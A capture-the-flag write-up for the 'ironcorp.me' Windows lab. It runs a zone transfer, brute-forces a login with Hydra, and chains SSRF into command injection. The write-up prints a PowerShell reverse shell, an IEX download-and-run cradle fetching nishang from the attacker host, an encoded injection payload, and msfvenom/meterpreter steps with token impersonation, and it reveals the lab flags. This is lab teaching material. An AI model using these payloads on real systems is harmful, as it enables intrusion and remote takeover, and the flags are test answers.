
# PORT SCAN
---

| PORT  | SERVICE       |
| ----- | ------------- |
| 53    | domain        |
| 135   | msrpc         |
| 3389  | ms-wbt-server |
| 8080  | http          |
| 11025 | http          |


# RECONNAISSANCE
---

We need to add `ironcorp.me` to `/etc/hosts`:

```bash
echo 'IP ironcorp.me' | sudo tee -a /etc/hosts
```

![Pasted image 20250718170935.png](../../IMAGES/Pasted%20image%2020250718170935.png)

We got a dashboard, there were some interesting functionalities on here, but nothing that we could exploit, we can't register an account even though the functionality is on there, we can find this on profile:

![Pasted image 20250718170939.png](../../IMAGES/Pasted%20image%2020250718170939.png)


![Pasted image 20250718170946.png](../../IMAGES/Pasted%20image%2020250718170946.png)

![Pasted image 20250718170951.png](../../IMAGES/Pasted%20image%2020250718170951.png)

We can't upload images here too, seems like the page doesn't allow us too, it doesn't even let us make the request. The website at port `11025` doesn't have anything interesting and if we fuzz for hidden directories, nothing important comes in too, let's fuzz for vhosts then:

![Pasted image 20250718170956.png](../../IMAGES/Pasted%20image%2020250718170956.png)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://IP:11025 -H "Host: FUZZ.ironcorp.me" -mc 200,301,302 -t 100 -ic -c -fs 2739

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.55.173:11025
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.ironcorp.me
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response size: 2739
________________________________________________
```

Nothing came in, we're in a bit of a problem, this machine uses DNS, we can use `dig` to check if any hidden info could be there:

```bash
dig @IP ironcorp.me axfr

; <<>> DiG 9.20.9-1-Debian <<>> @10.10.55.173 ironcorp.me axfr
; (1 server found)
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 1083 msec
;; SERVER: 10.10.55.173#53(10.10.55.173) (TCP)
;; WHEN: Fri Jul 18 01:51:42 EDT 2025
;; XFR size: 5 records (messages 1, bytes 238)

```


We found some internal vhosts on here, strangely enough, ffuf didn't catch them on the scan, let's add them to `/etc/hosts` and check them out.

![Pasted image 20250718171003.png](../../IMAGES/Pasted%20image%2020250718171003.png)

Login to be able to access the web page, we don't know the credentials, we could assume that maybe this login isn't properly secured and it got some credentials that could be brute forced, let's try to brute force with `admin` as username, let's proceed with exploitation.


# EXPLOITATION
---

We can use hydra with `xato-net-10-million-passwords`, let's do it::

```bash
hydra -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -s 11025 admin.ironcorp.me http-get -t 40

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 23:36:56
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 40 tasks per 1 server, overall 40 tasks, 10000 login tries (l:1/p:10000), ~250 tries per task
[DATA] attacking http-get://admin.ironcorp.me:11025/
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-17 23:37:34
```

We were right, this were pretty simple credentials, it's always worth to check weak credentials in order to find any security issue, we can login now:

![Pasted image 20250718171009.png](../../IMAGES/Pasted%20image%2020250718171009.png)

Once we login, we can see a search bar, if we try a test search, we can see the format of the url:

```
http://admin.ironcorp.me:11025/?r=test#
```

Trying SQLI or XSS, throw us this:

![Pasted image 20250718171012.png](../../IMAGES/Pasted%20image%2020250718171012.png)


The search bar may be vulnerable to SSRF, let's try calling an external resource, we can create a test file and try to modify the url to match our python server:

```
http://admin.ironcorp.me:11025/?r=http%3A%2F%2F10.14.21.28%3A8000%2Fssrf.txt#
```

If we check our python server, we check the request being made:

![Pasted image 20250718171018.png](../../IMAGES/Pasted%20image%2020250718171018.png)

![Pasted image 20250718171023.png](../../IMAGES/Pasted%20image%2020250718171023.png)

That means we can fetch external resources and interpret them, what about internal resources?

We remember there's a `internal.ironcorp.me` Vhost, if we try to access it from outside, this happens:

![Pasted image 20250718171027.png](../../IMAGES/Pasted%20image%2020250718171027.png)

We need to access the resource internally in order to read it, let's try to do it:

```
http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2F#
```

![Pasted image 20250718171031.png](../../IMAGES/Pasted%20image%2020250718171031.png)

If we click `here`, we get redirected to another URL we can only access internally:

![Pasted image 20250718171037.png](../../IMAGES/Pasted%20image%2020250718171037.png)

But the URL format seems pretty odd, maybe we can chain this vulnerability with LFI on the `?name=` parameter, without proper sanitization, we may be able to read files, let's try, first, if we try without anything on the parameter, we can see this:

```
http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3D#
```

![Pasted image 20250718171043.png](../../IMAGES/Pasted%20image%2020250718171043.png)

It says:

```
My name is Equinox
```

If we use `test`:

```
http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dtest#
```

![Pasted image 20250718171050.png](../../IMAGES/Pasted%20image%2020250718171050.png)

The `test` gets appended to the initial name, what about `/etc/passwd`:

```
http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3D%2Fetc%2Fpasswd#
```

![670x166](../../IMAGES/Pasted%20image%2020250718171109.png)


I tried some LFI payloads but they didn't worked, that's when I though about other vulnerability.

If it's not LFI, what can we chain this with?

We could try `Command Injection`, we know that whatever we put gets embedded onto the output, what if we try a command to check if we get a response back, I'll open Caido to check the request better:

![Pasted image 20250718171410.png](../../IMAGES/Pasted%20image%2020250718171410.png) 

We already know the base request format, what if we use `|` and concatenate it with a command such as `whoami`:

```
?r=http://internal.ironcorp.me:11025/name.php?name=test|whoami
```

![Pasted image 20250718171310.png](../../IMAGES/Pasted%20image%2020250718171310.png)

We get `nt authority\system` on the response, command injection exists on this parameter, knowing that, we can get a reverse shell, since this is a windows machine, let's build a Powershell command:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If we use simple URL encode on here, we get `bad request` on the response, I tried executing it with double and triple encoding, but it didn't worked.

It doesn't mean we can't get a shell, we need to have a different approach, we know we can call outside resources, so, let's simply host a reverse shell file and have it executed it so it gets us a reverse shell back, we can use `nishang`  `Invoke-PowershellTcp.ps1` script;


https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1


Once we grab the shell, we need to host a python server and set up our listener.

The flow will be the following, first, we'll download the file, execute it in memory using `IEX` and call the `Invoke-PowerShellTcp` function with our Ip and port, we can use the following command to achieve this:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.14.21.28:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.14.21.28 -Port 4444"
```


We can use burp's `decoder` functionality to encode our payload in order for it to work:

![Pasted image 20250718171323.png](../../IMAGES/Pasted%20image%2020250718171323.png)


So, our final request should look like this:

```http
/?r=http://internal.ironcorp.me:11025/name.php?name=test|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%64%25%36%33%25%32%30%25%32%32%25%34%39%25%34%35%25%35%38%25%32%38%25%34%65%25%36%35%25%37%37%25%32%64%25%34%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%34%65%25%36%35%25%37%34%25%32%65%25%35%37%25%36%35%25%36%32%25%34%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%34%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%31%25%33%34%25%32%65%25%33%32%25%33%31%25%32%65%25%33%32%25%33%38%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%33%62%25%32%30%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%30%25%32%64%25%35%32%25%36%35%25%37%36%25%36%35%25%37%32%25%37%33%25%36%35%25%32%30%25%32%64%25%34%39%25%35%30%25%34%31%25%36%34%25%36%34%25%37%32%25%36%35%25%37%33%25%37%33%25%32%30%25%33%31%25%33%30%25%32%65%25%33%31%25%33%34%25%32%65%25%33%32%25%33%31%25%32%65%25%33%32%25%33%38%25%32%30%25%32%64%25%35%30%25%36%66%25%37%32%25%37%34%25%32%30%25%33%34%25%33%34%25%33%34%25%33%34%25%32%32
```

If we check our listener and python server, we can see the reverse shell and the file being downloaded:

![Pasted image 20250718171328.png](../../IMAGES/Pasted%20image%2020250718171328.png)

![Pasted image 20250718171331.png](../../IMAGES/Pasted%20image%2020250718171331.png)

Let's begin privilege escalation.


# PRIVILEGE ESCALATION
---

As seen, we are `nt authority\system`, but we can't read all files on the system actually:

```powershell
PS E:\xampp\htdocs\internal> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/11/2020   4:41 AM                Admin
d-----        4/11/2020  11:07 AM                Administrator
d-----        4/11/2020  11:55 AM                Equinox
d-r---        4/11/2020  10:34 AM                Public
d-----        4/11/2020  11:56 AM                Sunlight
d-----        4/11/2020  11:53 AM                SuperAdmin
d-----        4/11/2020   3:00 AM                TEMP

PS E:\xampp\htdocs\internal> dir C:\Users\Admin
PS E:\xampp\htdocs\internal> dir : Access to the path 'C:\Users\Admin' is denied.
At line:1 char:1
+ dir C:\Users\Admin
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admin:String) [Get-C
   hildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.
   Commands.GetChildItemCommand


PS E:\xampp\htdocs\internal> dir C:\Users\SuperAdmin
PS E:\xampp\htdocs\internal> dir : Access to the path 'C:\Users\SuperAdmin' is denied.
At line:1 char:1
+ dir C:\Users\SuperAdmin
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\SuperAdmin:String) [
   Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.
   Commands.GetChildItemCommand
```


We can't either access `Admin` or `SuperAdmin`, which is weird, if we check our privileges, we can find this:

```powershell
PS E:\xampp\htdocs\internal> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

We got a bunch of privileges, the one that interests us the most is `SeImpersonatePrivilege`, with this privilege enabled, we can impersonate the real administrator and retrieve the root flag, in order to do this, we can use `incognito` from `metasploit`, so, we need to get a meterpreter shell.

Let's begin by generating our shell, we can use msfvenom since there's no AV we need to bypass:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.21.28 LPORT=9001 -f psh -o revshell.ps1
```

Ok, time to get the exploit on the machine, we can use `cerutil` or a simple Powershell command:

```powershell
Invoke-WebRequest -Uri "http://10.14.21.28:8000/revshell.ps1" -OutFile "revshell.ps1"
```

Once we got our file, we need to start our listener on metasploit, we'll use multi handler:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9001; exploit"
```

Once our listener is set, we can use the exploit:

```
.\revshell.ps1
```

![Pasted image 20250718171346.png](../../IMAGES/Pasted%20image%2020250718171346.png)

![Pasted image 20250718171349.png](../../IMAGES/Pasted%20image%2020250718171349.png)

We got our shell, it's time to use `incognito` to impersonate the administrator token:

```
meterpreter > load incognito
Loading extension incognito...Success.
```

Now, we need to list all available tokens:

```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-8VMBKF3G815\Admin
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
```

We need to impersonate the `WIN-8VMBKF3G815\Admin` one, since this is the real administrator:

```
meterpreter > impersonate_token "WIN-8VMBKF3G815\Admin"
[+] Delegation token available
[+] Successfully impersonated user WIN-8VMBKF3G815\Admin
```

![Pasted image 20250718171357.png](../../IMAGES/Pasted%20image%2020250718171357.png)

With the token impersonated, we can finally read the root flag and end the CTF:

```
PS C:\Users\Administrator\Desktop> type C:\Users\Administrator\Desktop\user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}

E:\xampp\htdocs\internal>type C:\Users\Admin\Desktop\root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}
```


![Pasted image 20250718171400.png](../../IMAGES/Pasted%20image%2020250718171400.png)

